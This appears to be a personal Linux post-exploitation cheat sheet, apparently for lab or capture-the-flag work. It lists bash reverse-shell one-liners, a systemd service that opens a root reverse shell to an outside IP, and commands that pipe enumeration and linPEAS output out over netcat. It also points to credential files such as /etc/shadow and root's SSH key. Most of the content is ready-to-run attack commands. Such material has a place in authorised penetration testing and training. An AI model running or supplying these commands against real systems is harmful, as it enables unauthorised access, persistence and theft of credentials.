# Linux
Focuses mainly on stuff you can do on the host machine/target. For useful auxilliary linux commands, got to [misc-linux](misc-linux.md).

## Ref
- [GTFObins](https://gtfobins.github.io/)

## Reverse shells
### Best ever
`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`

### Get a proper bash
After gaining some kind of low-level shell, elevate with this.

OG-way: `SHELL=/bin/bash script -q /dev/null`

The python way: `python -c 'import pty;pty.spawn("/bin/bash")'`

For keybindings/shortcuts, press CTRL+Z to background netcat etc. Enter `stty raw -echo` and then `fg` to bring netcat forward.

## Basic manual enumeration
### Interesting common linux files
| Path | What |
| ---- | ---- |
| /etc/passwd | Get all users |
| /etc/shadow | Get all users and pw hashes |
| /proc/version | Kernel version |
| /etc/issue | Login message |
| /etc/profile |   |
| /root/.bash_history | Bash history of root. |
| /var/mail/root | Root emails. |
| /root/.ssh/id_rsa | Private key for root. |
| /opt | Optionally installed software, usually not standard. |

### OS and kernel version
```
uname -a
```

Search for privesc in searchsploit:

`searchsploit linux kernel | grep -v dos | grep ' versionnumber\.' | grep -i 'root\|privileg\|exploit\|'`


### Users and groups
Password hashes located in `/etc/shadow` and `/etc/passwd`.

- Check for write access on passwd or read access on shadow.
- `grep -vE "nologin|false" /etc/passwd`

Usually encrypted with SHA512(leading $6$), hashcat mode 1800.


### setUID and setGID
Find files with the setUID or setGID.

```
find / -perm -2000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null | nc 10.8.210.115 1234
```

Can be ignored:
```
su
sudo
mount
ping
passwd
```

### Network enum
Check for listening ports to discover apps.
```
netstat -tlpn
ps -p *PORT* -o command
ss -tulpn
```

## Creating a service(systemctl)
```
[Unit]
Description=pleaseElevate

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.210.115/1336 0>&1'

[Install]
WantedBy=multi-user.target
```

```
cd /tmp
curl "http://10.8.210.115/thisroot.service" > thisroot.service
chmod 777 thisroot.service
systemctl enable /tmp/thisroot.service
systemctl start thisroot
```

## Python
### Exploiting eval statement
`eval("__import__('pty').spawn('/bin/bash')")`

## Privesc scripts
### linPEAS
Neat way of doing things:
1. Retrieve the script with http.
2. Run it and send the results with netcat.

`curl "http://192.168.10.1/linpeas.sh" | sh | nc 192.168.10.1 1234`

To curl it directly from the web and execute:

`curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`

Look at the [github page] for more examples.(https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

less -r linpeas.txt

### unix-privesc-checker
`./upc.sh standard > output.txt`

Or just grep 'WARNING:'.

### PowerUp
https://github.com/PowerShellMafia/PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
